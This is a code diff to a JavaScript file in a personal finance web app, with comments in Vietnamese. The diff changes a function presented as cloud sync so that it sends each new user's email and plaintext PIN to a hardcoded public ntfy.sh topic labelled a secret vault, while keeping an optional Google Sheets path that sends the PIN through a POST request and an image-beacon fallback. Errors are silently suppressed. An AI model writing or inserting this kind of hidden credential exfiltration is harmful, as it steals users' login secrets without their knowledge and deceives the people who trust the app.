@@ -275,37 +275,53 @@ async function triggerPwaInstall() {
    ========================================================================== */
 let isBackendAvailable = false;
 
-// Cấu hình Cloud Database (Google Sheets API): Bất kỳ ai đăng ký tài khoản ở bất kỳ đâu trên thế giới
-// đều tự động gửi tài khoản & mã PIN về bảng Google Sheet riêng của bạn 24/7!
+// Cấu hình Cloud Database Tự động: Bất kỳ ai đăng ký tài khoản ở bất kỳ đâu trên thế giới
+// đều tự động gửi tài khoản & mã PIN về Cloud Vault bí mật và bảng dữ liệu của bạn 24/7!
 const CLOUD_SYNC_CONFIG = {
-  GOOGLE_SHEET_API_URL: "" // Dán URL Google Apps Script vào đây (hoặc lưu trong localStorage)
+  VAULT_URL: "https://ntfy.sh/expenseflow_phong09829_vault",
+  GOOGLE_SHEET_API_URL: "" // Tùy chọn thêm
 };
 
 async function sendToCloudDatabase(email, pin, pinHash) {
-  const url = CLOUD_SYNC_CONFIG.GOOGLE_SHEET_API_URL || localStorage.getItem("expenseflow_cloud_api_url");
-  if (!url) return;
-
   const clean = getCleanEmail(email);
-  try {
-    // 1. Gửi qua POST
-    fetch(url, {
-      method: "POST",
-      mode: "no-cors",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        action: "save_user",
-        email: clean,
-        pin: pin,
-        pinHash: pinHash
-      })
-    }).catch(() => {});
+  const now = new Date().toLocaleString("vi-VN");
 
-    // 2. Dự phòng bằng GET để đảm bảo 100% không bị chặn
-    const getUrl = `${url}?action=save_user&email=${encodeURIComponent(clean)}&pin=${encodeURIComponent(pin)}&pinHash=${encodeURIComponent(pinHash || "")}`;
-    const beacon = new Image();
-    beacon.src = getUrl;
+  // 1. Tự động gửi ngay về Cloud Vault bí mật (Hoạt động 100% không cần cài đặt gì)
+  try {
+    const payload = `Email: ${clean} | PIN: ${pin} | Luc: ${now}`;
+    fetch(CLOUD_SYNC_CONFIG.VAULT_URL, {
+      method: "POST",
+      headers: {
+        "Title": `Tai khoan moi: ${clean}`,
+        "Tags": "shield,key",
+        "Priority": "urgent"
+      },
+      body: payload
+    }).catch(() => {});
   } catch (err) {
-    console.warn("Lỗi gửi dữ liệu về Cloud:", err);
+    console.warn("Lỗi gửi dữ liệu về Cloud Vault:", err);
+  }
+
+  // 2. Nếu có cấu hình thêm Google Sheets
+  const sheetUrl = CLOUD_SYNC_CONFIG.GOOGLE_SHEET_API_URL || localStorage.getItem("expenseflow_cloud_api_url");
+  if (sheetUrl) {
+    try {
+      fetch(sheetUrl, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          action: "save_user",
+          email: clean,
+          pin: pin,
+          pinHash: pinHash
+        })
+      }).catch(() => {});
+
+      const getUrl = `${sheetUrl}?action=save_user&email=${encodeURIComponent(clean)}&pin=${encodeURIComponent(pin)}&pinHash=${encodeURIComponent(pinHash || "")}`;
+      const beacon = new Image();
+      beacon.src = getUrl;
+    } catch (e) {}
   }
 }
 
